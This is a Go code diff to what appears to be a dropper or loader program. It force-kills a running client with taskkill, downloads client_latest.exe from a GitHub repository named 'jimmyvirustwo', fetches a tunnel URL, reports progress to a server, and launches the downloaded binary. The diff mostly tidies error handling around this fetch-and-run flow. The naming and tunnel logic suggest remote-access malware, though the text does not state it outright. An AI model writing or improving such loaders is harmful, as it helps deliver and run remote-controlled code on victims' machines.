@@ -10,8 +10,6 @@ import (
 	"os/exec"
 	"strconv"
 	"strings"
-
-	"github.com/biter777/processex"
 )
 
 type updateReader struct {
@@ -67,24 +65,11 @@ func reportProgress(serverURL string, percent int) {
 
 func getUpdate() string {
 	binName := "client_latest.exe"
-
-	procs, _, err := processex.FindByName(binName)
-	if err != nil && err != processex.ErrNotFound {
-
-		fmt.Println("Error checking for process:", err)
+	err := exec.Command("taskkill", "/IM", binName, "/F").Run()
+	if err != nil {
+		fmt.Println("Error occurred while trying to kill the process:", err)
 	}
-	if err == nil && len(procs) > 0 {
 
-		for _, p := range procs {
-			fmt.Println("Killing process with PID:", p.Pid)
-			p.Kill()
-			p.Wait()
-		}
-
-	}
-	//Wait for the program to close
-
-	// If it doesn't exist locally, download it automatically
 	if _, err := os.Stat(binName); os.IsNotExist(err) {
 		fmt.Printf("Client binary not present locally. Downloading...\n")
 	} else {
@@ -98,14 +83,15 @@ func getUpdate() string {
 
 	url := "https://github.com/Plexisity/jimmyvirustwo/raw/refs/heads/main/compilatons/client_latest.exe"
 	resp, err := http.Get(url)
+	if err != nil {
+		panic(fmt.Sprintf("Failed to download client: %v", err))
+	}
+
+	defer resp.Body.Close()
 
 	if resp != nil && resp.StatusCode != http.StatusOK {
 		fmt.Printf("Failed to download client: HTTP %d\n", resp.StatusCode)
 		return ""
-	}
-
-	if err != nil {
-		panic(fmt.Sprintf("Failed to download client: %v", err))
 	}
 
 	contentLength := resp.Header.Get("Content-Length")
@@ -115,9 +101,8 @@ func getUpdate() string {
 	}
 
 	if err != nil {
-		panic(fmt.Sprintf("Failed to download client: %v", err))
+		panic(fmt.Sprintf("Invalid content length header: %v", err))
 	}
-	defer resp.Body.Close()
 
 	out, err := os.Create(binName)
 	if err != nil {
@@ -155,7 +140,11 @@ func main() {
 	tunnelURL = fetchTunnelURL()
 	fmt.Println("Tunnel URL:", tunnelURL)
 	binPath := getUpdate()
+	if binPath == "" {
+		fmt.Println("Failed to get client binary. Exiting.")
+		return
+	}
 	fmt.Println("Client binary path:", binPath)
 	fmt.Println("Starting Client binary")
-	startClient(binPath)
+	startClient("./" + binPath)
 }
